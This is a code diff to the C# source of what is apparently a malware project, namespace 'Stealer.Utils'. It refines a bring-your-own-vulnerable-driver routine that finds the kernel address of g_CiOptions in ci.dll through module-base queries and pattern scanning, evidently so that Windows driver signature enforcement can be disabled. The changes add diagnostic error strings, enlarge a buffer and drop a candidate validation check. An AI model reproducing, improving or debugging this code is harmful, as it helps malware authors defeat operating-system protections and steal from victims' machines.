@@ -171,10 +171,11 @@ namespace Stealer.Utils
                 try
                 {
                     // 2. Find g_CiOptions kernel address
-                    IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress(hDev);
+                    string errDetail = null;
+                    IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress(hDev, out errDetail);
                     if (gCiOptionsKernelAddr == IntPtr.Zero)
                     {
-                        errorMsg = "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
+                        errorMsg = errDetail ?? "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
                         return false;
                     }
 
@@ -371,18 +372,31 @@ namespace Stealer.Utils
             return false;
         }
 
-        private static IntPtr FindGCiOptionsAddress(IntPtr hDev)
+        private static IntPtr FindGCiOptionsAddress(IntPtr hDev, out string errDetail)
         {
+            errDetail = null;
             IntPtr ciKernelBase = GetKernelModuleBase("ci.dll");
             if (ciKernelBase == IntPtr.Zero)
+            {
+                errDetail = "BYOVD: GetKernelModuleBase(ci.dll) returned 0";
                 return IntPtr.Zero;
+            }
 
             string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
             string ciPath = Path.Combine(system32Path, "ci.dll");
-            if (!File.Exists(ciPath)) return IntPtr.Zero;
+            if (!File.Exists(ciPath))
+            {
+                errDetail = "BYOVD: ci.dll not found at " + ciPath;
+                return IntPtr.Zero;
+            }
 
             IntPtr userCiBase = LoadLibraryEx(ciPath, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
-            if (userCiBase == IntPtr.Zero) return IntPtr.Zero;
+            if (userCiBase == IntPtr.Zero)
+            {
+                int lErr = Marshal.GetLastWin32Error();
+                errDetail = "BYOVD: LoadLibraryEx(ci.dll) failed with Win32 error " + lErr;
+                return IntPtr.Zero;
+            }
 
             try
             {
@@ -402,6 +416,11 @@ namespace Stealer.Utils
                     gCiOptionsKernelAddr = ScanModuleForGCiOptionsPattern(userCiBase, ciKernelBase, hDev, dataRva, dataSize);
                 }
 
+                if (gCiOptionsKernelAddr == IntPtr.Zero)
+                {
+                    errDetail = "BYOVD: Pattern scan found no g_CiOptions candidate (ciKernelBase=0x" + ciKernelBase.ToString("X") + ")";
+                }
+
                 return gCiOptionsKernelAddr;
             }
             finally
@@ -414,12 +433,12 @@ namespace Stealer.Utils
         {
             int size = 0;
             NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out size);
-            if (size == 0) return IntPtr.Zero;
+            if (size == 0) size = 1024 * 1024;
 
-            IntPtr buffer = Marshal.AllocHGlobal(size);
+            IntPtr buffer = Marshal.AllocHGlobal(size + 16384);
             try
             {
-                if (NtQuerySystemInformation(SystemModuleInformation, buffer, size, out size) != 0)
+                if (NtQuerySystemInformation(SystemModuleInformation, buffer, size + 16384, out size) != 0)
                     return IntPtr.Zero;
 
                 int moduleCount = Marshal.ReadInt32(buffer);
@@ -468,12 +487,7 @@ namespace Stealer.Utils
                     IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
                     long offset = userTarget.ToInt64() - userCiBase.ToInt64();
                     IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-
-                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
-                    {
-                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                        if (val != 0) return cand;
-                    }
+                    return cand;
                 }
             }
 
